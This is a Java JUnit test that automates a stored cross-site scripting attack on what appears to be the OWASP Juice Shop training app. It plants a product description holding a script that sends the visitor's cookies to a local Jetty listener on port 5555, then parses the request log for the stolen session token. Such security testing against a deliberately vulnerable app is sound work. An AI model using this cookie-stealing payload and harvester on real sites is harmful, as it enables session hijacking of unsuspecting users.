import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import org.eclipse.jetty.server.Handler;
import org.eclipse.jetty.server.NCSARequestLog;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.handler.*;
import org.junit.AfterClass;
import org.junit.Assert;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.*;

import java.util.Properties;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static io.restassured.RestAssured.given;

public class JuiceShopXSS {

    private static Server server;

    @BeforeClass
    public static void startTestPageServer() throws Exception {
        server = new Server(5555);

        configureJettyLogging();

        server.start();
    }

    @AfterClass
    public static void stopTestPageServer() throws Exception {
        server.stop();
    }

    @Test
    public void runTheAttack() {
        try {
            loadProps();
            placePayload();
            reloadPage();
            evaluateResults();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void loadProps() throws IOException {
        Properties properties = new Properties();

        try(InputStream stream = getClass().getClassLoader().getResourceAsStream("config.properties")){
            properties.load(stream);
        }

        // Load config
        RestAssured.baseURI = properties.getProperty("base-uri");
        RestAssured.port = Integer.parseInt(properties.getProperty("port"));
        RestAssured.basePath = properties.getProperty("base-path");

        if (!properties.getProperty("proxy_ip").equals("")) {
            RestAssured.proxy(properties.getProperty("proxy_ip"), Integer.parseInt(properties.getProperty("proxy_port")));
        }

        System.out.println(">>> loadProps done.");

    }

    private void placePayload() {

        String payloadXXS3 = "{" +
                "\"id\": 1," +
                "\"name\":" +
                "\"Apple Juice (1000ml)\"," +
                "\"description\": \"XSS Payload : " +
                "<script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie</script>\"," +
                "\"price\": 1.99," +
                "\"image\": \"apple_juice.jpg\"," +
                "\"createdAt\": \"2016-11-23 11:02:05.000 +00:00\"," +
                "\"updatedAt\": \"2016-11-23 11:02:05.000 +00:00\"," +
                "\"deletedAt\": null" +
                "}";

        RestAssured.basePath = "";

        given().
                request().
                body(payloadXXS3).
                contentType(ContentType.JSON).
                when().
                put("/api/Products/1").
                then().
                statusCode(200);

        System.out.println(">>> placePayload done.");

    }

    //TODO: Only a manual page reload runs the stored payload. Is there another possibility to refresh the page?
    private void reloadPage() {
        RestAssured.
                given().
                header("Accept","application/json, text/plain, */*").
                header("Referer","http://192.168.99.100:3000/").
                header("Cache-Control","no-cache").
                header("Cookie","token=something").
                get("/rest/product/search?q=banana");

        RestAssured.
                given().
                header("Accept","application/json, text/plain, */*").
                header("Referer","http://192.168.99.100:3000/").
                header("Cache-Control","no-cache").
                header("Cookie","token=something").
                get("/rest/product/search?q=apple");

        System.out.println(">>> reloadPage done.");

        //Sleeping here to have time for manual page reload.
        try {
        Thread.sleep(10000);
        } catch (Exception e) {
            e.printStackTrace();
        }

        System.out.println(">>> Leaving jetty open for 10 seconds to have time for manual page reload ...");
    }

    private static void configureJettyLogging() {

        HandlerCollection handlers = new HandlerCollection();
        ContextHandlerCollection contexts = new ContextHandlerCollection();
        RequestLogHandler requestLogHandler = new RequestLogHandler();
        handlers.setHandlers(new Handler[]{contexts,new DefaultHandler(),requestLogHandler});
        server.setHandler(handlers);

        NCSARequestLog requestLog = new NCSARequestLog("jetty-request.log");
        requestLog.setRetainDays(90);
        requestLog.setAppend(false);
        requestLog.setExtended(false);
        requestLog.setLogTimeZone("GMT");
        requestLogHandler.setRequestLog(requestLog);


        System.out.println(">>> configureJettyLogging done.");

    }

    private void evaluateResults() throws IOException {
        BufferedReader bufRead = new BufferedReader(new FileReader("jetty-request.log"));
        String line;

        if ((line = bufRead.readLine()) != null)
        {
            if (line.contains("token")) {
                System.out.println(">>> Success! Log contains token.");
                Pattern p = Pattern.compile("token=\\S*");
                Matcher m = p.matcher(line);
                m.find();
                System.out.println(">>> Token found: "+m.group());

            } else {
                System.out.println(">>> No token was found. Is a user logged in?");
            }
        } else {
            Assert.fail(">>> No jetty server log. Proxy on? Page refreshed manually?");
        }
    }
}
